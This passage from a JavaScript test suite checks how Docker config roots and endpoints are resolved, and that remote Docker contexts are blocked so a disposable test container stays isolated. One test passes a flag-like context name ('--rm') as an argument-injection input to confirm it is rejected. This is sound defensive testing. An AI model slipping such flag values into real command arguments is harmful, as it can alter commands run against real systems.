    const root = getDockerConfigRoot({
      DOCKER_CONFIG: tempDir,
      HOME: '/some/unwanted/home',
    });
    assert.equal(root.isCustom, true);
    assert.equal(root.path, path.resolve(tempDir));
  } finally {
    await removeTempDir(tempDir);
  }
});

test('R5.3-P1-B: resolveEffectiveDockerEndpoint resolves currentContext from custom DOCKER_CONFIG', async () => {
  const tempDir = await createTempDir('docker-config-ctx-');
  try {
    const configPath = path.join(tempDir, 'config.json');
    await fsp.writeFile(configPath, JSON.stringify({ currentContext: 'isolated-context' }), 'utf8');

    const effective = resolveEffectiveDockerEndpoint({
      env: { DOCKER_CONFIG: tempDir },
      contextInspector: (ctx) => {
        assert.equal(ctx, 'isolated-context');
        return 'unix:///var/run/isolated.sock';
      },
    });
    assert.equal(effective.source, 'DEFAULT_CONTEXT');
    assert.equal(effective.context, 'isolated-context');
    assert.equal(effective.rawEndpoint, 'unix:///var/run/isolated.sock');
  } finally {
    await removeTempDir(tempDir);
  }
});

test('R5.3-P1-B: resolveEffectiveDockerEndpoint fails closed when custom DOCKER_CONFIG has corrupted JSON', async () => {
  const tempDir = await createTempDir('docker-config-corrupt-');
  try {
    const configPath = path.join(tempDir, 'config.json');
    await fsp.writeFile(configPath, '{ invalid json content', 'utf8');

    const effective = resolveEffectiveDockerEndpoint({
      env: { DOCKER_CONFIG: tempDir },
    });
    assert.equal(effective.rawEndpoint, null);
    assert.equal(effective.error, 'CORRUPTED_DOCKER_CONFIG_JSON');
  } finally {
    await removeTempDir(tempDir);
  }
});

test('R5.3-P1-B: resolveEffectiveDockerEndpoint fails closed when custom DOCKER_CONFIG directory does not exist', () => {
  const effective = resolveEffectiveDockerEndpoint({
    env: { DOCKER_CONFIG: '/nonexistent/custom/docker/config/dir' },
  });
  assert.equal(effective.rawEndpoint, null);
  assert.equal(effective.error, 'DOCKER_CONFIG_DIR_NOT_FOUND');
});

test('R5.4-P1: getDockerConfigRoot normal path', async () => {
  const tempDir = await createTempDir('docker-cfg-normal-');
  try {
    const root = getDockerConfigRoot({ DOCKER_CONFIG: tempDir });
    assert.equal(root.isCustom, true);
    assert.equal(root.path, path.resolve(tempDir));
  } finally {
    await removeTempDir(tempDir);
  }
});

test('R5.4-P1: getDockerConfigRoot with trailing space preserves exact path fidelity without trimming', async () => {
  const baseDir = await createTempDir('docker-cfg-base-');
  try {
    const trailingDir = path.join(baseDir, 'cfg-trailing ');
    await fsp.mkdir(trailingDir);
    const root = getDockerConfigRoot({ DOCKER_CONFIG: trailingDir });
    assert.equal(root.isCustom, true);
    assert.equal(root.path, trailingDir);
    assert.ok(root.path.endsWith(' '));
  } finally {
    await removeTempDir(baseDir);
  }
});

test('R5.4-P1: getDockerConfigRoot with leading space preserves exact path fidelity without trimming', async () => {
  const baseDir = await createTempDir('docker-cfg-base-');
  try {
    const leadingDir = path.join(baseDir, ' cfg-leading');
    await fsp.mkdir(leadingDir);
    const root = getDockerConfigRoot({ DOCKER_CONFIG: leadingDir });
    assert.equal(root.isCustom, true);
    assert.equal(root.path, leadingDir);
    assert.ok(path.basename(root.path).startsWith(' '));
  } finally {
    await removeTempDir(baseDir);
  }
});

test('R5.4-P1: two config directories differing only by whitespace resolve to distinct contexts and endpoints', async () => {
  const baseDir = await createTempDir('docker-cfg-pair-');
  try {
    const dirA = path.join(baseDir, 'cfg-pair');
    const dirB = path.join(baseDir, 'cfg-pair ');
    await fsp.mkdir(dirA);
    await fsp.mkdir(dirB);

    // dirA: context A
    const metaDirA = path.join(dirA, 'contexts', 'meta');
    await fsp.mkdir(metaDirA, { recursive: true });
    await fsp.writeFile(path.join(dirA, 'config.json'), JSON.stringify({ currentContext: 'ctx-a' }), 'utf8');
    await fsp.writeFile(
      path.join(metaDirA, 'meta.json'),
      JSON.stringify({ Name: 'ctx-a', Endpoints: { docker: { Host: 'unix:///var/run/ctx-a.sock' } } }),
      'utf8'
    );

    // dirB: context B
    const metaDirB = path.join(dirB, 'contexts', 'meta');
    await fsp.mkdir(metaDirB, { recursive: true });
    await fsp.writeFile(path.join(dirB, 'config.json'), JSON.stringify({ currentContext: 'ctx-b' }), 'utf8');
    await fsp.writeFile(
      path.join(metaDirB, 'meta.json'),
      JSON.stringify({ Name: 'ctx-b', Endpoints: { docker: { Host: 'unix:///var/run/ctx-b.sock' } } }),
      'utf8'
    );

    // Resolving with dirA
    const resA = resolveEffectiveDockerEndpoint({ env: { DOCKER_CONFIG: dirA } });
    assert.equal(resA.source, 'DEFAULT_CONTEXT');
    assert.equal(resA.context, 'ctx-a');
    assert.equal(resA.rawEndpoint, 'unix:///var/run/ctx-a.sock');

    // Resolving with dirB
    const resB = resolveEffectiveDockerEndpoint({ env: { DOCKER_CONFIG: dirB } });
    assert.equal(resB.source, 'DEFAULT_CONTEXT');
    assert.equal(resB.context, 'ctx-b');
    assert.equal(resB.rawEndpoint, 'unix:///var/run/ctx-b.sock');
  } finally {
    await removeTempDir(baseDir);
  }
});

test('R5.4-P1: config root does not exist fails closed without fallback to HOME', () => {
  const nonExistent = '/nonexistent/path/for/docker/config';
  const root = getDockerConfigRoot({ DOCKER_CONFIG: nonExistent, HOME: '/some/home' });
  assert.equal(root.isCustom, true);
  assert.equal(root.path, path.resolve(nonExistent));

  const effective = resolveEffectiveDockerEndpoint({
    env: { DOCKER_CONFIG: nonExistent, HOME: '/some/home' },
  });
  assert.equal(effective.rawEndpoint, null);
  assert.equal(effective.error, 'DOCKER_CONFIG_DIR_NOT_FOUND');
});

test('R5.4-P1: DOCKER_CONFIG empty string defaults to HOME/.docker per Docker CLI semantics', () => {
  const root = getDockerConfigRoot({ DOCKER_CONFIG: '', HOME: '/my/user/home' });
  assert.equal(root.isCustom, false);
  assert.equal(root.path, path.join('/my/user/home', '.docker'));
});

test('R5.4-P1: HOME with spaces in path preserves exact directory without trimming', () => {
  const homeWithSpace = '/Users/test user name ';
  const root = getDockerConfigRoot({ DOCKER_CONFIG: '', HOME: homeWithSpace });
  assert.equal(root.isCustom, false);
  assert.equal(root.path, path.join(homeWithSpace, '.docker'));
});

test('R5.4-P1: no fallback to HOME/.docker when DOCKER_CONFIG is specified', async () => {
  const baseDir = await createTempDir('docker-fallback-check-');
  try {
    const fakeHome = path.join(baseDir, 'fake-home');
    const fakeHomeDocker = path.join(fakeHome, '.docker');
    const fakeHomeMeta = path.join(fakeHomeDocker, 'contexts', 'meta');
    await fsp.mkdir(fakeHomeMeta, { recursive: true });
    await fsp.writeFile(
      path.join(fakeHomeDocker, 'config.json'),
      JSON.stringify({ currentContext: 'valid-home-ctx' }),
      'utf8'
    );
    await fsp.writeFile(
      path.join(fakeHomeMeta, 'meta.json'),
      JSON.stringify({ Name: 'valid-home-ctx', Endpoints: { docker: { Host: 'unix:///var/run/home.sock' } } }),
      'utf8'
    );

    const nonExistentConfig = path.join(baseDir, 'nonexistent-custom-config');
    const effective = resolveEffectiveDockerEndpoint({
      env: {
        DOCKER_CONFIG: nonExistentConfig,
        HOME: fakeHome,
      },
    });

    assert.equal(effective.rawEndpoint, null);
    assert.equal(effective.error, 'DOCKER_CONFIG_DIR_NOT_FOUND');
    assert.notEqual(effective.context, 'valid-home-ctx');
  } finally {
    await removeTempDir(baseDir);
  }
});

test('R5.2-P1: resolveEffectiveDockerEndpoint uses active context when neither env var is set', () => {
  const effective = resolveEffectiveDockerEndpoint({
    env: {},
    activeContextResolver: () => 'production-remote',
    contextInspector: (ctx) => `ssh://deploy@${ctx}`,
  });
  assert.equal(effective.source, 'DEFAULT_CONTEXT');
  assert.equal(effective.context, 'production-remote');
  assert.equal(effective.rawEndpoint, 'ssh://deploy@production-remote');
});

test('R5.2-P1: resolveEffectiveDockerEndpoint rejects flag-like active context name', () => {
  const effective = resolveEffectiveDockerEndpoint({
    env: {},
    activeContextResolver: () => '--rm',
  });
  assert.equal(effective.rawEndpoint, null);
  assert.equal(effective.error, 'INVALID_CONTEXT_NAME');
});

test('R5.2-P1: validateTargetIsolation blocks remote active context when DOCKER_HOST and DOCKER_CONTEXT are unset', () => {
  assert.throws(
    () => {
      validateTargetIsolation({
        dbContainer: 'crm-dumpcheck-test',
        env: {},
        activeContextResolver: () => 'remote-swarm',
        contextInspector: () => 'tcp://swarm.corp.net:2375',
      });
    },
    (err) => {
      assert.equal(err.code, 'REMOTE_DOCKER_CONTEXT_BLOCKED');
      assert.match(err.message, /remote Docker context 'remote-swarm' blocked/);
      return true;
    },
  );
});

test('R5.2-P1: verifyDisposableTestTarget fails closed when default context is remote', async () => {
  await assert.rejects(
    async () => {
      await verifyDisposableTestTarget(
        'crm-dumpcheck-test',
        async () => { throw new Error('should not reach psqlRunner'); },
        {
          activeContextResolver: () => 'prod-cluster',
          contextInspector: () => 'ssh://root@prod-cluster',
        },
      );
    },
    (err) => {
      assert.equal(err.code, 'REMOTE_DOCKER_CONTEXT_BLOCKED');
      assert.match(err.message, /remote DOCKER_CONTEXT blocked: prod-cluster/);
      return true;
    },
  );
});

test('R5.2-P1: isDockerContainerAvailable returns false when default context is remote', async () => {
  const avail = await isDockerContainerAvailable('crm-dumpcheck-test', {
    activeContextResolver: () => 'prod-cluster',
    contextInspector: () => 'tcp://prod:2375',
  });
  assert.equal(avail, false);
});

// Import the full suite of Group A, B, C, D regression tests
import './docker-safety.test.mjs';
